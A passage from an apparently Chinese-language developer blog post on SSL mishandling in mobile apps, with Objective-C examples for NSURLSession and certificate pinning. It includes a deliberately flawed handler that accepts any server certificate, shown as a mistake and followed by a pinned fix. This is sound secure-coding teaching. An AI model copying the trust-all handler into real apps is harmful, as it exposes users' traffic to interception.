            &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CFIndex&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CFDataGetLength&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverCertificateData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;NSData&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cert1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSData&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;dataWithBytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSUInteger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

            &lt;span class=&quot;n&quot;&gt;NSString&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSBundle&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;mainBundle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;pathForResource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;@&quot;random-org&quot;&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ofType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;@&quot;der&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;NSData&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cert2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSData&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;dataWithContentsOfFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cert1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cert2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* failed */&lt;/span&gt;

            &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BOOL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;equal&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cert1&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;isEqualToData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cert2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;equal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* failed */&lt;/span&gt;

            &lt;span class=&quot;c1&quot;&gt;// The only good exit point&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;useCredential&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLCredential&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;credentialForTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
                        &lt;span class=&quot;nl&quot;&gt;forAuthenticationChallenge:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// Bad dog&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;cancelAuthenticationChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;處理方式與前面的 Android 情況2類同，做了 certificate pinning。&lt;/p&gt;

&lt;h4 id=&quot;ios-錯誤處理情況3&quot;&gt;iOS 錯誤處理情況3&lt;/h4&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-objc&quot; data-lang=&quot;objc&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;k&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;URLSession&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSession&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;session&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;didReceiveChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLAuthenticationChallenge&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;challenge&lt;/span&gt;
  &lt;span class=&quot;nf&quot;&gt;completionHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSessionAuthChallengeDisposition&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;disposition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                              &lt;span class=&quot;n&quot;&gt;NSURLCredential&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;credential&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;completionHandler&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;NSURLProtectionSpace&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;authenticationMethod&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;isEqualToString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLAuthenticationMethodServerTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;SecTrustRef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;completionHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSessionAuthChallengeUseCredential&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLCredential&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;credentialForTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;completionHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSessionAuthChallengePerformDefaultHandling&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;與前面 NSURLConnection 的情況類同，只是這裡使用到的是 iOS7  新增的 NSURLSession 元件。對應的處理方式如下：&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-objc&quot; data-lang=&quot;objc&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;k&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;URLSession&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSession&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;session&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;didReceiveChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLAuthenticationChallenge&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;challenge&lt;/span&gt;
  &lt;span class=&quot;nf&quot;&gt;completionHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSessionAuthChallengeDisposition&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;disposition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                              &lt;span class=&quot;n&quot;&gt;NSURLCredential&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;credential&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;completionHandler&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;([[[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;authenticationMethod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;isEqualToString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLAuthenticationMethodServerTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;SecTrustRef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;OSStatus&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SecTrustEvaluate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;errSecSuccess&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;completionHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSessionAuthChallengeCancelAuthenticationChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

            &lt;span class=&quot;n&quot;&gt;NSData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;localCertData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSData&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;dataWithContentsOfFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:[[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSBundle&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;mainBundle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
                                                   &lt;span class=&quot;nl&quot;&gt;pathForResource:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;@&quot;random-org&quot;&lt;/span&gt;
                                                            &lt;span class=&quot;nl&quot;&gt;ofType:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;@&quot;der&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]];&lt;/span&gt;

            &lt;span class=&quot;n&quot;&gt;SecCertificateRef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remoteServerCert&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SecTrustGetCertificateAtIndex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;CFDataRef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remoteCertData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SecCertificateCopyData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remoteServerCert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;BOOL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;isMatch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;localCertData&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;isEqualToData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__bridge&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NSData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remoteCertData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;CFRelease&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remoteCertData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;isMatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;completionHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSessionAuthChallengeUseCredential&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLCredential&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;credentialForTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;completionHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSessionAuthChallengeCancelAuthenticationChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;completionHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSessionAuthChallengePerformDefaultHandling&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h4 id=&quot;對-webview-的一些補充&quot;&gt;對 WebView 的一些補充&lt;/h4&gt;
&lt;p&gt;在對 WebView 做處理上，除了對 SSL 錯誤直接略過外，目前無論是在 Android 還是 iOS 上，SDK API 都尚未直接提供方法讓開發者能在 SSL Handshake 的途中作 Server Certificate Pinning。其中一個替代方法是，利用其他能夠作 Pinning 的元件將資料下載回來，接著把資料傳到 WebView 進行讀取，避開原本用 WebView 直接設定連線網址。蘋果公司有提供這種處理的&lt;a href=&quot;https://developer.apple.com/library/ios/samplecode/CustomHTTPProtocol/Introduction/Intro.html&quot;&gt;範例&lt;/a&gt;。&lt;/p&gt;

&lt;h3 id=&quot;結語&quot;&gt;結語&lt;/h3&gt;
&lt;p&gt;本來為了提高安全性而使用的 SSL 加密連線，卻由於程式處理不當讓原來的保護形同虛設。觀念不足與為節省時間而沒做好處理相信是主要原因。網路上大量的文章在引指開發者略過錯誤警告的時候，卻沒有提醒他們這樣做帶來的影響，也助長了不當處理的發生。&lt;/p&gt;

&lt;p&gt;除了 SSL 處理問題外，手機應用程式開發還有許多要注意的安全問題，像是 OWASP 列出的 &lt;a href=&quot;https://www.owasp.org/index.php/Projects/OWASP_Mobile_Security_Project_-_Top_Ten_Mobile_Risks&quot;&gt;Top 10 Mobile Risks&lt;/a&gt;、由日本智慧型手機安全協會發佈 &lt;a href=&quot;http://www.jssec.org/report/android_securecoding_en_20140801.html&quot;&gt;Android Application Secure Design/Secure Coding Guidebook&lt;/a&gt; 裡面所建議的。開發商有責任做好安全把關以保障雙方權益。&lt;/p&gt;

&lt;h3 id=&quot;參考&quot;&gt;參考&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://android-ssl.org&quot;&gt;Rethinking SSL Development in an Appified World&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://android-developers.blogspot.com/2012/03/unifying-key-store-access-in-ics.html&quot;&gt;Unifying Key Store Access in ICS | Android Developers Blog&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://commonsware.com/blog/2013/03/04/ssl-android-basics.html&quot;&gt;The CommonsBlog — SSL on Android: The Basics&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://developer.android.com/training/articles/security-ssl.html&quot;&gt;Security with HTTPS and SSL | Android Developers&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://developer.apple.com/librarY/mac/documentation/NetworkingInternet/Conceptual/NetworkingTopics/Articles/OverridingSSLChainValidationCorrectly.html&quot;&gt;Networking Programming Topics: Overriding TLS Chain Validation Correctly&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://developer.apple.com/library/ios/technotes/tn2232/_index.html&quot;&gt;Technical Note TN2232: HTTPS Server Trust Evaluation&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Certificate_and_Public_Key_Pinning&quot;&gt;Certificate and Public Key Pinning - OWASP&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;footnotes&quot; role=&quot;doc-endnotes&quot;&gt;
  &lt;ol&gt;
    &lt;li id=&quot;fn:note1&quot; role=&quot;doc-endnote&quot;&gt;
